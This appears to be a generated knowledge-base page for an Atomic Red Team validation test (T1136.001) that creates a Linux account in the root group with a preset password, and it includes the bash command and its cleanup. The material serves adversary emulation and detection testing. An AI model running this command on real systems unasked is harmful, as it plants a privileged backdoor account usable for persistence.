---
atomic_guid: "a1040a30-d28b-4eda-bd99-bb2861a4616c"
title: "Create a new user in Linux with `root` UID and GID."
framework: "atomic"
generated: "true"
attack_technique_id: "T1136.001"
attack_technique_name: "Create Account: Local Account"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "bash"
aliases:
  - "a1040a30-d28b-4eda-bd99-bb2861a4616c"
  - "Create a new user in Linux with `root` UID and GID."
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Create a new user in Linux with `root` UID and GID.

Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.

## Metadata

- Atomic GUID: a1040a30-d28b-4eda-bd99-bb2861a4616c
- Technique: T1136.001: Create Account: Local Account
- Platforms: linux
- Executor: bash
- Elevation Required: True
- Source Path: atomics/T1136.001/T1136.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1136-create_account|T1136.001]]

## Input Arguments

### password

- description: Password of the user to create
- type: string
- default: BetterWithButter

### username

- description: Username of the user to create
- type: string
- default: butter

## Executor

- elevation_required: True
- name: bash

### Command

```bash
useradd -g 0 -M -d /root -s /bin/bash #{username}
if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "#{username}:#{password}" | sudo chpasswd; else echo "#{password}" | passwd --stdin #{username}; fi;
```

### Cleanup

```bash
userdel #{username}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.yaml)
